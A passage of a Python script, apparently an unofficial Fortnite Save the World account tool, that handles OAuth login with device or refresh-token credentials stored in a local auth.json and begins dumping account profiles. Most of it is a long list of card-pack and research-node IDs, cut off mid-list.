        with open(authPath, "w") as authFile: json.dump({"WARNING": "Don't show anyone the contents of this file, because it contains information with which the program logs into the account.", "authType": "device",  "deviceId": deviceId, "accountId": vars.accountId, "secret": secret}, authFile, indent = 2)
    print("\nThe auth.json file was generated successfully.\n")

# Log in.
def login():
    authJson = json.loads(open(authPath, "r").read())
    try: authJson["authType"]
    except: customError("The program is unable to read the auth.json file. Delete the auth.json file and run this program again to generate a new one.")
    if authType == "token":
        if authJson["authType"] == "device": customError("The authorization type in config is set to token, but the auth.json file contains device auth credentials.\nDelete the auth.json file and run this program again to generate a token one or change authorization type back to device in config.ini.")
        expirationDate, refreshToken = [authJson["refresh_expires_at"], authJson["refreshToken"]]
        if expirationDate < datetime.now().isoformat(): customError("The refresh token has expired. Delete the auth.json file and run this program again to generate a new one. If this problem persists try to log in using the device auth type.")
    if authType == "device":
        if authJson["authType"] == "token": customError("The authorization type in config is set to device, but the auth.json file contains token auth credentials.\nDelete the auth.json file and run this program again to generate a device one or change authorization type back to token in config.ini.")
        deviceId, secret = [authJson["deviceId"], authJson["secret"]]
    vars.accountId = authJson["accountId"]
    if authType == "token": # Shoutout to BayGamerYT for telling me about this login method.
        reqRefreshToken = requestText(session.post(links.getOAuth.format("token"), headers={"Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="}, data={"grant_type": "refresh_token", "refresh_token": refreshToken}), True)
        with open(authPath, "r") as getAuthFile: authFile = json.loads(getAuthFile.read())
        authFile['refreshToken'], authFile['refresh_expires_at'] = [reqRefreshToken["refresh_token"], reqRefreshToken["refresh_expires_at"]]
        with open(authPath, "w") as getAuthFile: json.dump(authFile, getAuthFile, indent = 2)
        reqExchange = requestText(session.get(links.getOAuth.format("exchange"), headers={"Authorization": f"bearer {reqRefreshToken['access_token']}"}, data={"grant_type": "authorization_code"}), True)
        reqToken = requestText(session.post(links.getOAuth.format("token"), headers={"Authorization": "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="}, data={"grant_type": "exchange_code", "exchange_code": reqExchange["code"], "token_type": "eg1"}), True)
    if authType == "device": reqToken = requestText(session.post(links.getOAuth.format("token"), headers={"Authorization": "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="}, data={"grant_type": "device_auth", "device_id": deviceId, "account_id": vars.accountId, "secret": secret, "token_type": "eg1"}), True)
    vars.accessToken, vars.displayName = [reqToken['access_token'], reqToken['displayName']]
    vars.headers = {"User-Agent": "Fortnite/++Fortnite+Release-19.40-CL-19215531 Windows/10.0.19043.1.768.64bit", "Authorization": f"bearer {vars.accessToken}", "Content-Type": "application/json", "X-EpicGames-Language": lang, "Accept-Language": lang}
    print(f"Logged in as {vars.displayName}.\n")

# Dump profiles.
def dumpProfiles(profilesList, profile0ProfilesList, profilePath, headersFormat1, headersFormat2, headersFormat3):
    profileCount = 0
    for profile in profilesList:
        bProfileDumped = False
        profileCount += 1
        profileFilePath = os.path.join(profilePath, f"{profile}.json")
        if profile == "profile0":
            bCanDump = True
            for profile0Profile in profile0ProfilesList:
                if not os.path.exists(os.path.join(profilePath, f"{profile0Profile}.json")): bCanDump = False
            if bCanDump == True:
                supportedLlamas, profile0Nodes, validBanners, attributes = [["cardpack:choicepack_generic", "cardpack:cardpack_silver_xp", "cardpack:cardpack_silver_weapons", "cardpack:cardpack_silver_traps", "cardpack:cardpack_silver_ranged", "cardpack:cardpack_silver_personnel", "cardpack:cardpack_silver_melee", "cardpack:cardpack_silver_halloween", "cardpack:cardpack_silver", "cardpack:cardpack_rare_ranged", "cardpack:cardpack_rare_personnel", "cardpack:cardpack_rare_melee", "cardpack:cardpack_rare_heroes", "cardpack:cardpack_jackpot_super", "cardpack:cardpack_jackpot", "cardpack:cardpack_gold_xp", "cardpack:cardpack_gold_weapons", "cardpack:cardpack_gold_traps", "cardpack:cardpack_gold_ranged", "cardpack:cardpack_gold_personnel", "cardpack:cardpack_gold_melee", "cardpack:cardpack_gold_halloween", "cardpack:cardpack_gold", "cardpack:cardpack_bronze_xp", "cardpack:cardpack_bronze_weekly", "cardpack:cardpack_bronze_weapons", "cardpack:cardpack_bronze_traps", "cardpack:cardpack_bronze_ranged", "cardpack:cardpack_bronze_personnel", "cardpack:cardpack_bronze_melee", "cardpack:cardpack_bronze_halloween", "cardpack:cardpack_bronze", "cardpack:cardpack_basic_silver", "cardpack:cardpack_basic", "cardpack:cardpack_basic_tutorial", "cardpack:cardpack_bronze_collectionbook", "cardpack:cardpack_bronze_reward", "cardpack:cardpack_jackpot_collectionbook", "cardpack:cardpack_silver_collectionbook", "cardpack:cardpack_traps_collectionbook", "cardpack:cardpack_weapons_collectionbook", "cardpack:testcardpacklvl", "cardpack:cardpack_worker_vr", "cardpack:cardpack_worker_uc", "cardpack:cardpack_worker_sr", "cardpack:cardpack_worker_r", "cardpack:cardpack_worker_c", "cardpack:cardpack_weapon_vr", "cardpack:cardpack_weapon_uc", "cardpack:cardpack_weapon_sr", "cardpack:cardpack_weapon_r", "cardpack:cardpack_weapon_c", "cardpack:cardpack_trapwalldarts_uc", "cardpack:cardpack_trapceilinggas_uc", "cardpack:cardpack_trap_vr", "cardpack:cardpack_trap_uc", "cardpack:cardpack_trap_sr", "cardpack:cardpack_trap_r", "cardpack:cardpack_trap_c", "cardpack:cardpack_survivor_vr", "cardpack:cardpack_survivor_uc", "cardpack:cardpack_survivor_sr", "cardpack:cardpack_survivor_r", "cardpack:cardpack_survivor_c", "cardpack:cardpack_schematic_vr", "cardpack:cardpack_schematic_uc", "cardpack:cardpack_schematic_sr", "cardpack:cardpack_schematic_r", "cardpack:cardpack_schematic_c", "cardpack:cardpack_ranged_vr", "cardpack:cardpack_ranged_uc", "cardpack:cardpack_ranged_sr", "cardpack:cardpack_ranged_sniper_vr", "cardpack:cardpack_ranged_sniper_uc", "cardpack:cardpack_ranged_sniper_sr", "cardpack:cardpack_ranged_sniper_r", "cardpack:cardpack_ranged_sniper_c", "cardpack:cardpack_ranged_shotgun_vr", "cardpack:cardpack_ranged_shotgun_uc", "cardpack:cardpack_ranged_shotgun_sr", "cardpack:cardpack_ranged_shotgun_r", "cardpack:cardpack_ranged_shotgun_c", "cardpack:cardpack_ranged_r", "cardpack:cardpack_ranged_pistol_vr", "cardpack:cardpack_ranged_pistol_uc", "cardpack:cardpack_ranged_pistol_sr", "cardpack:cardpack_ranged_pistol_r", "cardpack:cardpack_ranged_pistol_c", "cardpack:cardpack_ranged_c", "cardpack:cardpack_ranged_assault_vr", "cardpack:cardpack_ranged_assault_uc", "cardpack:cardpack_ranged_assault_sr", "cardpack:cardpack_ranged_assault_r", "cardpack:cardpack_ranged_assault_c", "cardpack:cardpack_melee_vr", "cardpack:cardpack_melee_uc", "cardpack:cardpack_melee_tool_vr", "cardpack:cardpack_melee_tool_uc", "cardpack:cardpack_melee_tool_sr", "cardpack:cardpack_melee_tool_r", "cardpack:cardpack_melee_tool_c", "cardpack:cardpack_melee_sword_vr", "cardpack:cardpack_melee_sword_uc", "cardpack:cardpack_melee_sword_sr", "cardpack:cardpack_melee_sword_r", "cardpack:cardpack_melee_sword_c", "cardpack:cardpack_melee_sr", "cardpack:cardpack_melee_spear_vr", "cardpack:cardpack_melee_spear_uc", "cardpack:cardpack_melee_spear_sr", "cardpack:cardpack_melee_spear_r", "cardpack:cardpack_melee_spear_c", "cardpack:cardpack_melee_scythe_vr", "cardpack:cardpack_melee_scythe_uc", "cardpack:cardpack_melee_scythe_sr", "cardpack:cardpack_melee_scythe_r", "cardpack:cardpack_melee_scythe_c", "cardpack:cardpack_melee_r", "cardpack:cardpack_melee_club_vr", "cardpack:cardpack_melee_club_uc", "cardpack:cardpack_melee_club_sr", "cardpack:cardpack_melee_club_r", "cardpack:cardpack_melee_club_c", "cardpack:cardpack_melee_c", "cardpack:cardpack_melee_axe_vr", "cardpack:cardpack_melee_axe_uc", "cardpack:cardpack_melee_axe_sr", "cardpack:cardpack_melee_axe_r", "cardpack:cardpack_melee_axe_c", "cardpack:cardpack_manager_vr", "cardpack:cardpack_manager_uc", "cardpack:cardpack_manager_trainer_vr", "cardpack:cardpack_manager_trainer_sr", "cardpack:cardpack_manager_trainer_r", "cardpack:cardpack_manager_sr", "cardpack:cardpack_manager_soldier_vr", "cardpack:cardpack_manager_soldier_sr", "cardpack:cardpack_manager_soldier_r", "cardpack:cardpack_manager_r", "cardpack:cardpack_manager_martialartist_vr", "cardpack:cardpack_manager_martialartist_sr", "cardpack:cardpack_manager_martialartist_r", "cardpack:cardpack_manager_inventor_vr", "cardpack:cardpack_manager_inventor_sr", "cardpack:cardpack_manager_inventor_r", "cardpack:cardpack_manager_gadgeteer_vr", "cardpack:cardpack_manager_gadgeteer_sr", "cardpack:cardpack_manager_gadgeteer_r", "cardpack:cardpack_manager_explorer_vr", "cardpack:cardpack_manager_explorer_sr", "cardpack:cardpack_manager_explorer_r", "cardpack:cardpack_manager_engineer_vr", "cardpack:cardpack_manager_engineer_sr", "cardpack:cardpack_manager_engineer_r", "cardpack:cardpack_manager_doctor_vr", "cardpack:cardpack_manager_doctor_sr", "cardpack:cardpack_manager_doctor_r", "cardpack:cardpack_manager_c", "cardpack:cardpack_hero_vr", "cardpack:cardpack_hero_uc", "cardpack:cardpack_hero_sr", "cardpack:cardpack_hero_r", "cardpack:cardpack_hero_outlander_vr", "cardpack:cardpack_hero_outlander_uc", "cardpack:cardpack_hero_outlander_sr", "cardpack:cardpack_hero_outlander_r", "cardpack:cardpack_hero_ninja_vr", "cardpack:cardpack_hero_ninja_uc", "cardpack:cardpack_hero_ninja_sr", "cardpack:cardpack_hero_ninja_r", "cardpack:cardpack_hero_constructor_vr", "cardpack:cardpack_hero_constructor_uc", "cardpack:cardpack_hero_constructor_sr", "cardpack:cardpack_hero_constructor_r", "cardpack:cardpack_hero_commando_vr", "cardpack:cardpack_hero_commando_uc", "cardpack:cardpack_hero_commando_sr", "cardpack:cardpack_hero_commando_r", "cardpack:cardpack_defendersniper_vr", "cardpack:cardpack_defendersniper_uc", "cardpack:cardpack_defendersniper_sr", "cardpack:cardpack_defendersniper_r", "cardpack:cardpack_defendersniper_c", "cardpack:cardpack_defendershotgun_vr", "cardpack:cardpack_defendershotgun_uc", "cardpack:cardpack_defendershotgun_sr", "cardpack:cardpack_defendershotgun_r", "cardpack:cardpack_defendershotgun_c", "cardpack:cardpack_defenderpistol_vr", "cardpack:cardpack_defenderpistol_uc", "cardpack:cardpack_defenderpistol_sr", "cardpack:cardpack_defenderpistol_r", "cardpack:cardpack_defenderpistol_c", "cardpack:cardpack_defendermelee_vr", "cardpack:cardpack_defendermelee_uc", "cardpack:cardpack_defendermelee_sr", "cardpack:cardpack_defendermelee_r", "cardpack:cardpack_defendermelee_c", "cardpack:cardpack_defenderassault_vr", "cardpack:cardpack_defenderassault_uc", "cardpack:cardpack_defenderassault_sr", "cardpack:cardpack_defenderassault_r", "cardpack:cardpack_defenderassault_c", "cardpack:cardpack_defender_vr", "cardpack:cardpack_defender_uc", "cardpack:cardpack_defender_sr", "cardpack:cardpack_defender_r", "cardpack:cardpack_defender_c", "cardpack:cardpack_defenderfoundersassault_vr", "cardpack:cardpack_defenderfounderspistol_vr", "cardpack:cardpack_ranged_explosive_r", "cardpack:ccp_halloween_heroes", "cardpack:cardpack_wrapper_unresolvedchoice", "cardpack:cardpack_wrapper_choice_test_multichoice", "cardpack:cardpack_wrapper_choice_test_basic", "cardpack:cardpack_wrapper_choice_test", "cardpack:cardpack_choice_weapon_vr", "cardpack:cardpack_choice_weapon_sr", "cardpack:cardpack_choice_weapon_r", "cardpack:cardpack_choice_test_doublechoice3", "cardpack:cardpack_choice_test_doublechoice2", "cardpack:cardpack_choice_test_doublechoice1", "cardpack:cardpack_choice_test3", "cardpack:cardpack_choice_test2", "cardpack:cardpack_choice_ranged_vr", "cardpack:cardpack_choice_ranged_sr", "cardpack:cardpack_choice_ranged_r", "cardpack:cardpack_choice_melee_vr", "cardpack:cardpack_choice_melee_sr", "cardpack:cardpack_choice_melee_r", "cardpack:cardpack_choice_manager_vr", "cardpack:cardpack_choice_manager_sr", "cardpack:cardpack_choice_manager_r", "cardpack:cardpack_choice_hero_vr", "cardpack:cardpack_choice_hero_sr", "cardpack:cardpack_choice_hero_r", "cardpack:cardpack_choice_defender_vr", "cardpack:cardpack_choice_defender_sr", "cardpack:cardpack_choice_defender_r", "cardpack:cardpack_choice_all_vr", "cardpack:cardpack_choice_all_sr", "cardpack:cardpack_choice_all_r", "cardpack:cardpack_event_2017_winter_1", "cardpack:cardpack_choice_event_founders", "cardpack:cardpack_event_founders", "cardpack:cardpack_event_founders_nonexclusive", "cardpack:cardpack_founders_assault_auto_sr", "cardpack:cardpack_founders_banners_t01", "cardpack:cardpack_founders_banners_t02", "cardpack:cardpack_founders_banners_t03", "cardpack:cardpack_founders_banners_t04", "cardpack:cardpack_founders_banners_t05", "cardpack:cardpack_founders_constructor_bundle", "cardpack:cardpack_founders_constructor_weapon_sr", "cardpack:cardpack_founders_constructor_weapon_vr", "cardpack:cardpack_founders_ninja_bundle", "cardpack:cardpack_founders_ninja_weapon_sr", "cardpack:cardpack_founders_ninja_weapon_vr", "cardpack:cardpack_founders_outlander_bundle", "cardpack:cardpack_founders_outlander_weapon_sr", "cardpack:cardpack_founders_outlander_weapon_vr", "cardpack:cardpack_founders_pistol_rapid_vr", "cardpack:cardpack_founders_soldier_bundle", "cardpack:cardpack_founders_soldier_weapon_sr", "cardpack:cardpack_founders_soldier_weapon_vr", "cardpack:cardpack_founders_starterweapons_bundle", "cardpack:cardpack_starter_assault_auto_r", "cardpack:cardpack_starter_edged_sword_medium_r", "cardpack:cardpack_starter_floor_spikes_r", "cardpack:cardpack_starter_shotgun_standard_r", "cardpack:cardpack_starter_sniper_boltaction_scope_r", "cardpack:cardpack_custom_firecracker_r"], ["1_main_ba01a2361", "1_main_38e8a5bf4", "1_main_ad1499e010", "1_main_27c02fc60", "1_main_0011ccd10", "1_main_904080840", "1_main_609c8a9a8", "1_main_9fdb916e6", "1_main_3ffc8e9d7", "1_main_8d2c3c4d0", "1_main_fabc7c290", "1_main_b1aef23d10", "1_main_498ab88f0", "1_main_e05f04d75", "1_main_849930d55", "1_main_b1a3a3771", "1_main_77f7b7826", "1_main_0336ac827", "1_main_0abacb4e2", "1_main_702f364c0", "1_main_243215d30", "1_main_0cbf7fec0", "1_main_38ead7850", "1_main_bd2b45b61", "1_main_a16a56111", "1_main_7a5e40920", "1_main_195c3ef52", "1_main_92e3e2179", "1_main_254cfa5515", "1_main_c06961e711", "1_main_266068670", "1_main_59607c6f0", "1_main_2546ecfc0", "1_main_a7e71bed0", "1_research_0b612c970", "1_research_a157c8e30", "1_research_a4f269d10", "1_research_248fc3870", "1_research_3e28bb331", "1_research_d2ce27910", "1_research_8707af440", "1_research_c3d05c4b2", "1_research_1bc2be641", "1_research_6114fc651", "1_research_ad50db9e1", "1_research_b543610a1", "1_research_eecd426c1", "1_research_700f196a3", "1_research_a8db35494", "1_research_11c82b1d0", "1_research_f01d00360", "1_research_b5b8eb7c0", "1_research_e9f394960", "1_research_43a8f68c0", "1_research_7382d2480", "1_research_b0d9537a1", "1_research_a5cf39400", "1_research_5201143f2", "1_research_369e5eac1", "1_research_790bdd533", "1_research_307838811", "1_research_2d0f29ab1", "1_research_1538ca901", "1_research_ed5b34d91", "1_research_04b2a68a4", "1_main_b4f394680", "1_main_3e84c12d0", "1_main_0d681a741", "1_main_e9c41e050", "1_main_88f02d792", "1_main_fd10816b3", "1_main_dcb242b70", "1_main_d0b070910", "1_main_bf8f555f0", "1_main_2e3589b80", "1_main_8991222d1", "1_main_911d30562", "1_main_d1c9e5993", "1_main_826346530", "1_main_f681ab1f0", "1_main_1637f10c4", "1_main_2996f5c10", "1_main_58591e630", "1_main_8a41e9920", "1_main_0828407d3", "1_main_566bfea11", "1_main_f1eb76072", "1_main_448295574", "1_main_ff2595300", "1_main_1b6486fc0", "1_main_4bdcb2465", "1_main_986b7d201", "1_main_ad1d66991", "1_main_f6fa8ecb3", "1_main_8b125d0f0", "1_main_d4ed4a3c4", "1_main_faee79b10", "1_main_5faa4c765", "1_main_82efddb312", "1_main_2051efb31", "1_main_6e6f74400", "1_main_7064c2440", "1_main_4658a42d3", "1_main_20d6fb134", "1_main_640195112", "2_main_a3a5da870", "2_main_fb4378a61", "2_main_25efb8c70", "2_main_b8e0a6a91", "2_main_41217f7d2", "2_main_fe2869370", "2_main_19a17bde3", "2_main_d20a597a4", "2_main_6bede9b65", "2_main_a0995fcb0", "2_main_2367c82f1", "2_main_b8a9e7cc2", "2_main_f782a9cf3", "2_main_baaa5fa10", "2_main_dfa624051", "2_main_b99a48be2", "2_main_9bbf38680", "2_main_26f4fb891", "2_main_4c95a7d12", "2_main_f4e138243", "2_main_88d0c6de0", "2_main_b75effc64", "2_main_221229060", "2_main_fa6884911", "2_main_aeeef5183", "2_main_180921fb0", "2_main_63f751711", "2_main_6a6764682", "2_main_aebc27e24", "2_main_079edd2c0", "2_main_9d7fa9270", "2_main_bf1ae4c87", "2_main_75f1308c1", "2_main_a454a2615", "2_main_636f167a0", "2_main_21ce15e51", "2_main_3d00cb840", "2_main_fc5809c05", "2_main_d52b4f3e0", "2_main_be95ebe17", "2_main_2006052b6", "2_main_e1d78b190", "2_main_a9644ddd1", "2_main_117540212", "2_main_ec26c41d0", "2_main_3c068cfb0", "2_main_4e74e6f91", "2_main_b2e063fc1", "2_main_d192eec22", "2_main_d2fb71b12", "2_main_9fc3978c3", "2_main_cf6fd83e3", "2_main_5b37c9358", "2_main_f70ba14a0", "2_main_d26651800", "2_main_4c8171671", "2_main_74699c1b1", "2_main_01f9d82a0", "2_main_4d442c140", "2_main_07d55d6a0", "2_main_2d6993922", "2_main_e321e3463", "2_main_5346207c0", "2_main_04d5c4430", "2_main_a50295643", "2_main_b2a944ec4", "2_main_d80ba2e80", "2_main_ba14281e0", "2_main_07e641121", "2_main_fa6f27881", "2_main_bf56c52e2", "2_main_1fdf39db5", "2_main_93d6486a6", "2_main_166c29dc2", "2_main_a84a13c07", "2_main_cf49a9c40", "2_main_a225639b4", "2_main_d289c7c75", "2_main_f625d4f20", "2_main_2a17d7306", "2_main_e0e4352b0", "2_main_9670df2a7", "2_main_fbc34aa68", "2_main_f657b25c9", "2_main_c4bbdff80", "2_main_a1487c230", "2_main_69a5836f0", "2_main_cc1a24d76", "2_main_b98656430", "2_main_cbbb2ff11", "2_main_134007c27", "2_main_d76888e98", "2_main_9fe51adf0", "2_main_71b7c8aa0", "2_main_9fd8cee49", "2_main_ac3b8ce810", "2_main_c677c3af0", "2_main_9d4c8cd511", "2_main_1f8f85ae0", "2_main_d8d12ecf8", "3_main_3f0e7b000", "3_main_d111a2ee0", "3_main_a4c742e90", "3_main_dc39d9a60", "3_main_5147bfc91", "3_main_642745262", "3_main_1d1190e83", "3_main_223db7781", "3_main_bb28968a1", "3_main_22db38500", "3_main_924e29d91", "3_main_70c759670", "3_main_05ee62252", "3_main_68db04ee0", "3_main_5203ac5a1", "3_main_78cb0b021", "3_main_7b6ad6772", "3_main_f9620a490", "3_main_12deae460", "3_main_cdd911fa1", "3_main_3a06bc390", "3_main_e591a24b0", "3_main_e3c7c83c1", "3_main_b98f78c61", "3_main_9341def82", "3_main_54016f663", "3_main_bb09d9260", "3_main_d259fe9e0", "3_main_4363b46c1", "3_main_3dcec5d44", "3_main_211972050", "3_main_51fbb5b30", "3_main_1d3614b63", "3_main_5973f0934", "3_main_cc393d8c0", "3_main_93b01cc71", "3_main_1650b98b5", "3_main_a2eb05de0", "3_main_931cdf301", "3_main_0f646e3e2", "3_main_7cd55e053", "3_main_0cea80c20", "3_main_ad53df901", "3_main_c0c07fd02", "3_main_bbe9c2383", "3_main_41c374291", "3_main_5272ebf85", "3_main_3ea832246", "3_main_38ade9320", "3_main_62511cb01", "3_main_392b5c050", "3_main_ae0417420", "3_main_5f1ff8f01", "3_main_b22284a80", "3_main_fdea96100", "3_main_67dad5fe1", "3_main_3e101b6a5", "3_main_e5013a630", "3_main_114d8ad91", "3_main_2e9e28772", "3_main_8aec0c687", "3_main_21baebb70", "3_main_16213c9d1", "3_main_7aae50f90", "3_main_a9fee26b3", "3_main_d9b9c4a80", "3_main_da33a8740", "3_main_aaf369514", "3_main_b3ec767e5", "3_main_95a061850", "3_main_a9cd47110", "3_main_f6bcc2ac0", "3_main_5bbdca774", "3_main_4bb06ac83", "3_main_8a85e0460", "3_main_b2f8126f4", "3_main_aa2bd6745", "3_main_d17065500", "3_main_47fdebf30", "3_main_0f7cdf126", "3_main_c55707977", "3_main_9cff8acb8", "3_main_a9bdf1c40", "3_main_94beade00", "3_main_81657c2a0", "3_main_ff1800780", "3_main_4eca66830", "3_main_aa546fd04", "3_main_f6b1c09c1", "3_main_fa382d2a2", "3_main_0830e2535", "3_main_b31485f76", "3_main_4900856e7", "3_main_ba0f64d00", "3_main_b9e79e910", "3_main_844582e68", "3_main_c583b74e0", "3_main_df62b4190", "3_main_8c8c10de9", "3_main_c1c21e346", "4_main_223600910", "4_main_8014d8830", "4_main_234e42f51", "4_main_2fb647a80", "4_main_bd23d0af0", "4_main_c76c04c11", "4_main_631dbfa62", "4_main_a1cfb4ab3", "4_main_294c621c1", "4_main_e410950a2", "4_main_b2b288db0", "4_main_a30e056a0", "4_main_fca70a2b1", "4_main_eecd0c941", "4_main_f8a251ae2", "4_main_476e9f060", "4_main_8d4f9bed1", "4_main_477eabf92", "4_main_08545f6c0", "4_main_a23e778a0", "4_main_3d8125fa3", "4_main_70213e0d4", "4_main_9afb1fd60", "4_main_2a05ce670", "4_main_0b169c105", "4_main_08666d8d6", "4_main_888a664c0", "4_main_e6f4b67e0", "4_main_6e14c9711", "4_main_11d1bb631", "4_main_751262f92", "4_main_5968fe123", "4_main_6dac1dfd4", "4_main_9b36b5171", "4_main_8b174c410", "4_main_2210edd55", "4_main_96c918a20", "4_main_5406b8760", "4_main_9f152d8c6", "4_main_20f255b61", "4_main_384f84f57", "4_main_362079e30", "4_main_111c734d0", "4_main_22983e241", "4_main_cd327eaa1", "4_main_62bcc9a02", "4_main_b854d25d2", "4_main_d94772630", "4_main_d1da41ab0", "4_main_49df3cfd1", "4_main_65b1bcf51", "4_main_72793bd96", "4_main_94a92d3e7", "4_main_7cd9fda30", "4_main_908dd2be0", "4_main_155a29ba1", "4_main_1fc4328c1", "4_main_13f4802b0", "4_main_a29f04970", "4_main_ffa3b8d60", "4_main_c8a839111", "4_main_bc0e6f120", "4_main_fb88fbd52", "4_main_65a3a1de2", "4_main_0c7672723", "4_main_02652ede4", "4_main_44036cc70", "4_main_6572170a0", "4_main_ced279315", "4_main_152db9c30", "4_main_64cedc561", "4_main_ee2bc2321", "4_main_be19d3d22", "4_main_4b1d51060", "4_main_0a5d56161", "4_main_dc7e2b381", "4_main_4eed13ae1", "4_main_170f375f1", "4_main_140b284c0", "4_main_6ce978810", "4_main_6c92b3622", "4_main_fe1404bf2", "4_main_33a623670", "4_main_2c576f893", "4_main_9d72e3e50", "4_main_a1a4f7617", "4_main_da1126e08", "4_main_03bc55d00", "4_main_6ad9a53a0", "4_main_d9295a610", "4_main_a07ccefa0", "4_main_7003c8704", "4_main_c1e85d7b4", "4_main_66adedf16", "4_main_146871b30", "4_main_f0f851670", "4_main_c6ae84eb0", "4_main_2270189f0", "4_main_5da04f861", "4_main_7c7f5f5b1", "4_main_95489ef50", "1_research_7c7638680", "2_research_ea43fdb41", "2_research_45306c490", "2_research_794309e80", "2_research_8d3a925a1", "2_research_de7035662", "2_research_bc4833ee0", "2_research_cdc67fa60", "2_research_c90f99e71", "2_research_ec48272d2", "2_research_eb75bbd01", "2_research_49280c800", "2_research_ba7b225b0", "2_research_5f21793e0", "2_research_861d8ee12", "2_research_4384865e3", "2_research_69d354ca3", "2_research_e31381504", "2_research_f583eed84", "2_research_676ea9075", "2_research_ee4d092f5", "2_research_e29cc2d33", "2_research_8c57445f1", "2_research_1986ce6e1", "2_research_dc6f1ee52", "2_research_371f90623", "2_research_816377af1", "2_research_04f33fdd2", "2_research_c4dcb3993", "2_research_acf00fd11", "2_research_d71cc3522", "2_research_15f1dc0b3", "2_research_6c56aea04", "2_research_00e5b7763", "2_research_11fc257c5", "2_research_6c377c7b6", "2_research_941abaac5", "2_research_a0af3e194", "2_research_3afd81ba3", "2_research_5fb50d871", "2_research_b3f93c620", "2_research_5d47fe190", "2_research_f8bdeebb0", "2_research_c682fdd51", "2_research_81c6b0432", "2_research_d74cab422", "2_research_163260621", "2_research_72f6c6de0", "2_research_eb4af8030", "3_research_66ad113a1", "3_research_fe0bc1210", "3_research_aa1da8210", "3_research_a39241861", "3_research_bf9440313", "3_research_b43852611", "3_research_2a7f438c2", "3_research_e8cb49191", "3_research_aeb9b0780", "3_research_296889ea0", "3_research_c82820e21", "3_research_5d0cb6cf0", "3_research_87634d530", "3_research_9dac24cc1", "3_research_9a55874d0", "3_research_a1e8d6a12", "3_research_62e106c43", "3_research_f48de6842", "3_research_3a1909ab4", "3_research_cb48078a1", "3_research_6f0ef6ca5", "3_research_57056e764", "3_research_9b20cc2a3", "3_research_a7d38aea4", "3_research_8bccb9037", "3_research_4ed9f84a6", "3_research_202d50112", "3_research_0095dc2c3", "3_research_ba83ca3a3", "3_research_60b83c472", "3_research_cebb3b219", "3_research_ec3512538", "3_research_db4c9cf95", "3_research_9dbef7d52", "3_research_72a6a9015", "3_research_a78dd3873", "3_research_4877e8553", "3_research_e920b5567", "3_research_0ac5ccfd6", "3_research_97ee240b1", "3_research_4898c79d3", "3_research_ddcaa1041", "3_research_a3701b970", "3_research_ef9604c70", "3_research_868b67a00", "3_research_2e0654db1", "3_research_3bba74012", "3_research_244e0bae1", "3_research_e63953bc2", "3_research_cf78a5f20", "3_research_2989e24e1", "3_research_99d650340", "3_research_877423d00", "3_research_9b544a970", "3_research_e558c1f41", "3_research_cf908a9f2", "3_research_86c896df3", "3_research_24cde2f34", "3_research_40dca0bc1", "3_research_88ddafb05", "3_research_b708b4253", "3_research_af4dc7fb4", "3_research_c60271af5", "3_research_beb49e403", "3_research_2066c9ce7", "3_research_e1a249502", "3_research_1ef0f9b86", "3_research_18366f893", "3_research_0356c8b05", "3_research_8e5bf50b8", "3_research_a2c489547", "3_research_6ef8fb684", "3_research_330e09826", "3_research_f49975212", "3_research_eb7b4e453", "3_research_d3cc6c383", "3_research_9cde36052", "3_research_fccd6f5f9", "4_research_5d5da3875", "4_research_3465fe4c4", "4_research_0da1313b4", "4_research_f6fa2a943", "4_research_2c5e6ca32", "4_research_05f0e3251", "4_research_4ed905580", "4_research_806a452a0", "4_research_990fa7030", "4_research_fd6399601", "4_research_bede637c1", "4_research_6085ab582", "4_research_1782f61f2", "4_research_87bc668a3", "4_research_7c66e51a3", "4_research_0af63dbb1", "4_research_7a19bc553", "4_research_d8df26f42", "4_research_df4c1eb61", "4_research_1f3130d74", "4_research_24ecb6ed0", "4_research_6970ca911", "4_research_6950520a0", "4_research_0002ffce0", "4_research_ade43eb42", "4_research_cf5201c53", "4_research_a442e02e5", "4_research_c498d7916", "4_research_949685757", "4_research_5b2432e08", "4_research_c03156729", "4_research_86ea19cb10", "4_research_8a5cb4bd4", "4_research_2ac5dffe2", "4_research_96fcf31f4", "4_research_62f4d4c75", "4_research_e4f5b7d33", "4_research_6e74626d6", "4_research_ee28e1455", "4_research_d9b9acc97", "4_research_85834f016", "4_research_2d3408466", "4_research_d39889354", "4_research_cb52ed2e6", "4_research_b794a99c7", "4_research_e68b273f8", "4_research_e122d94b8", "4_research_92602bb17", "4_research_d59f481a7", "4_research_08e6699f8", "4_research_57f9b1498", "4_research_866e34969", "4_research_fbc54b5110", "4_research_c2263dd311", "4_research_85880b7a9", "4_research_29ab3fad9", "4_research_c510196d5", "4_research_77b7b7e021", "4_research_fbd13e0b20", "4_research_8c4ff2ff9", "4_research_9041558119", "4_research_50ad3c3a18", "4_research_bd65896217", "4_research_6de82be116", "4_research_1a3360f815", "4_research_5b05f0cd14", "4_research_143d055a13", "4_research_4b2b314212", "4_research_60becf5c11", "4_research_ffbeb25a5", "4_research_9f67db025", "4_research_dcf7d2104", "4_research_d469f49d4", "4_research_0b4e2eb53", "4_research_b0cbc67f2", "4_research_297cf12b1", "4_research_d178232f0", "4_research_143a1b010", "4_research_4cb258320", "4_research_4d72e54c1", "4_research_6d8f7dab2", "4_research_800c36e52", "4_research_7de649371", "4_research_6c012b1e3", "4_research_66a77bd23", "4_research_42b6496f1", "4_research_f1d475263", "4_research_a901dffe2", "4_research_37206d211", "4_research_478935174", "4_research_fd9a30f10", "4_research_b01ae71c0", "4_research_8c0d8b320", "4_research_5d2134621", "4_research_7c9260f62", "4_research_424af64a3", "4_research_7addbb805", "4_research_fbbd71c96", "4_research_30c626c17", "4_research_6421fcaf8", "4_research_e5101a759", "4_research_41ed22ce10", "4_research_4c1080774", "4_research_108dcec92", "4_research_f31044d14", "4_research_c858e35a5", "4_research_468e857a6", "4_research_0bee01b35", "4_research_040079b07", "4_research_1acfc7918", "4_research_8ebf80409", "4_research_303e53cc10", "4_research_bde783f111", "4_research_36cf54759", "4_research_e4ca598f8", "4_research_34b078c57", "4_research_ea348b7e6", "4_research_4857ffc06", "4_research_8006526c4", "4_research_9509cdbc7", "4_research_ced5c91e8", 